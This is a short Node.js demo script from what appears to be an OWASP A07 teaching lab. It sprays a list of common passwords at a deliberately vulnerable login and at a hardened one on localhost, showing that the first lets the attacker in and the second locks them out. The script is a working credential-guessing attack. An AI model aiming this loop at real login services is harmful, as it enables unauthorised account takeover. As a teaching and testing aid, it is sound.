'use strict';
/**
 * A07 — a tiny password-spraying demo. Points a common-password list at the
 * broken login (walks straight in) and the fixed one (locked out / blocked).
 * Usage:  node scripts/credential-stuffing.js [username]
 */
const USER = process.argv[2] || 'admin';
const BASE = process.env.BASE || 'http://localhost:3000';
const WORDLIST = ['123456', 'password', 'letmein', 'qwerty', 'welcome', 'admin', 'hunter2'];

async function spray(prefix) {
  let got = null, locked = false, blocked = false;
  for (const password of WORDLIST) {
    const res = await fetch(`${BASE}${prefix}/login`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ username: USER, password }),
    });
    if (res.status === 200) { got = password; break; }
    if (res.status === 429) locked = true;
    if (res.status === 403) blocked = true;
  }
  return { got, locked, blocked };
}

(async () => {
  console.log(`\nSpraying ${WORDLIST.length} common passwords at "${USER}"\n`);
  console.log('  /vuln/a07 :', await spray('/vuln/a07'));
  console.log('  /safe/a07 :', await spray('/safe/a07'));
  console.log('\nBroken: found the password. Fixed: locked out and/or blocked as a breached credential.\n');
})();
